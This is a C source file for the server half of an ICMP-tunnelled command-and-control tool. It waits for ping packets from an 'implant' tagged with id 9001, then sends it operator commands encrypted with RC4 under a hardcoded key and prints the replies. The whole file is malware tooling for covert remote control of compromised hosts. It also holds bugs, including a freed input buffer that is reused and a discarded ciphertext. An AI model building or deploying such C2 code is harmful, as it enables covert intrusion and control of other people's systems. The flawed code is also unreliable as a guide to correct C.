#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include "../include/c2.h"

// creates a raw ICMP socket and binds it
int create_socket(unsigned char *interface_to_bind) {
    int sockfd;

    // create the raw ICMP socket
    if ((sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP)) == -1) {
        perror("socket()");
        exit(1);
    }

    // bind it to the interface if specified
    if (interface_to_bind != NULL) {
        if (setsockopt(sockfd, SOL_SOCKET, SO_BINDTODEVICE, interface_to_bind, strlen(interface_to_bind)) < 0) {
            perror("setsockopt()");
            exit(1);
        }
    }

    return sockfd;
}

// calculate checksum (proudly? stolen from the internet)
unsigned short cksum(unsigned short *addr, int len) {
    int nleft = len;
    int sum = 0;
    unsigned short *w = addr;
    unsigned short answer = 0;

    while (nleft > 1) {
      sum += *w++;
      nleft -= 2;
    }

    if (nleft == 1) {
      *(unsigned char *)(&answer) = *(unsigned char *)w;
      sum += answer;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = ~sum;
    
    return answer;
}

#define N 256   // 2^8

void swap(unsigned char *a, unsigned char *b) {
    int tmp = *a;
    *a = *b;
    *b = tmp;
}

int KSA(unsigned char *key, unsigned char *S) {

    int len = strlen(key);
    int j = 0;

    for(int i = 0; i < N; i++)
        S[i] = i;

    for(int i = 0; i < N; i++) {
        j = (j + S[i] + key[i % len]) % N;

        swap(&S[i], &S[j]);
    }

    return 0;
}

int PRGA(unsigned char *S, unsigned char *plaintext, unsigned char *ciphertext) {
    int i = 0;
    int j = 0;

    for(size_t n = 0, len = strlen(plaintext); n < len; n++) {
        i = (i + 1) % N;
        j = (j + S[i]) % N;

        swap(&S[i], &S[j]);
        int rnd = S[(S[i] + S[j]) % N];

        ciphertext[n] = rnd ^ plaintext[n];

    }

    return 0;
}

int RC4(unsigned char *key, unsigned char *plaintext, unsigned char *ciphertext) {
    unsigned char S[N];
    KSA(key, S);

    PRGA(S, plaintext, ciphertext);

    return 0;
}


// get the input and return it's buffer
unsigned char *get_command(unsigned char *buffer) {
    unsigned char *cipher_text;

    write(1, "> ", 2);
    fgets(buffer, BUFFER_SIZE, stdin);

    cipher_text = (unsigned char *) malloc(strlen(buffer));
    RC4("password", buffer, cipher_text);

    free(buffer);
    return cipher_text;
}


// read from the socket and write the data in a buffer
int read_from_socket(int sockfd, unsigned char *buffer, int size) {
    int bytes_num = read(sockfd, buffer, size);

    if (bytes_num < 0) {
        return -1;
    }

    if (bytes_num > size) {
        fprintf(stderr, "the received packet is bigger than the designed size\n");
        return -1;
    }

    return 1;
}

// check if we got an actual connection from our implant
/* TODO: dynamic id */
int check_magic_byte(struct icmphdr *icmp) {
    if (icmp->type == 8 && icmp->un.echo.id == 9001) {
        return 1;
    }
    return 0;
}

// print from where we got our connection
void print_connection_succeed(unsigned char *src_ip) {
        printf("[!] Got a connection from %s\n", src_ip);
        printf("[!] Now you should be able to run your commands\n");
}
   
// prep'ing the IP headers for later usage
struct sockaddr_in prep_ip_headers(struct iphdr *ip) {
    struct sockaddr_in addr;

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = ip->saddr;

    return addr;
}

// parse the data section
unsigned char *parse_data_section(unsigned char *packet) {
    // get the data section (ignoring the IP & ICMP headers)
    unsigned char *data = (unsigned char *) (packet + sizeof(struct iphdr) + sizeof(struct icmphdr));
    
    data[strlen(data)] = '\0';

    return data;
}

// prep'ing the ICMP headers & setting up the checksum
void prep_icmp_headers(struct icmphdr *icmp, unsigned char *data, uint16_t checksum) {
    icmp->checksum = checksum;
    icmp->type = 8;
    icmp->un.echo.id = 9001;
}

// reuse the ICMP packet to append our input in the data section
void append_to_data_section(struct icmphdr *icmp, unsigned char *data, unsigned char *input) {
    memcpy((unsigned char *) data, input, strlen(input));

    uint16_t checksum = cksum((unsigned short *) icmp, sizeof(struct icmphdr) + strlen(input));

    prep_icmp_headers(icmp, data, checksum);
}

// the actual interaction occurs here
void interact(int sockfd) {
    struct iphdr *ip; // holds the IP header
    struct icmphdr *icmp; // holds the ICMP header
    struct sockaddr_in addr; // holds the IP address
    unsigned char *packet; // holds the ICMP packet
    unsigned char *data; // holds the ICMP packet's data section
    unsigned char *input; // holds the input buffer
    char src_ip[INET_ADDRSTRLEN]; // buffer to store the source IP (16 bytes)
    int bytes;
    int packet_size = sizeof(struct iphdr *) + sizeof(struct icmphdr *) + BUFFER_SIZE;

    input = (unsigned char *) malloc(BUFFER_SIZE);
    packet = (unsigned char *) malloc(packet_size);

    if (input == NULL || packet == NULL) {
        fprintf(stderr, "Error: Cannot allocate memory\n");
        free(input);
        free(packet);
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    printf("[+] Waiting for connections...\n");
    
    while (1) {
        if (read_from_socket(sockfd, packet, packet_size) < 0) {
            break;
        }

        ip = (struct iphdr *) packet;
        icmp = (struct icmphdr *) (packet + sizeof(struct iphdr));

        if (check_magic_byte(icmp)) {
            // convert the binary represenation of the IP address to a string
            inet_ntop(AF_INET, &ip->saddr, src_ip, sizeof(src_ip));
            
            print_connection_succeed(src_ip);

            addr = prep_ip_headers(ip);

            data = parse_data_section(packet);

            get_command(input);

            append_to_data_section(icmp, data, input);

            data = NULL;

            bytes = sendto(sockfd, icmp, sizeof(struct icmphdr) + strlen(input), 0, (struct sockaddr *) &addr, sizeof(addr));
            if (bytes < 0) {
                perror("sendto()");
                break;
            }

            memset(input, 0, strlen(input));
            memset(packet, 0, packet_size);
            break;
        }
    }

    while (1) {
        if (read_from_socket(sockfd, packet, packet_size) < 0) {
            break;
        }

        ip = (struct iphdr *) packet;
        icmp = (struct icmphdr *) (packet + sizeof(struct iphdr));

        if (check_magic_byte(icmp)) {

            addr = prep_ip_headers(ip);

            data = parse_data_section(packet);

            write(1, data, strlen(data));

            get_command(input);

            append_to_data_section(icmp, data, input);

            data = NULL;

            bytes = sendto(sockfd, icmp, sizeof(struct icmphdr) + strlen(input), 0, (struct sockaddr *) &addr, sizeof(addr));
            if (bytes < 0) {
                perror("sendto()");
                break;
            }

            // clean up the packet buffer for the next usage
            memset(packet, 0, packet_size);
            memset(input, 0, strlen(input));
        }
    }
    
    free(input);
    free(packet);
    close(sockfd);
    exit(EXIT_FAILURE);
}

// initializes the options and starts the c2
void c2_init_n_call(unsigned char *interface_to_bind) {
    int sockfd = create_socket(interface_to_bind);

    interact(sockfd);
}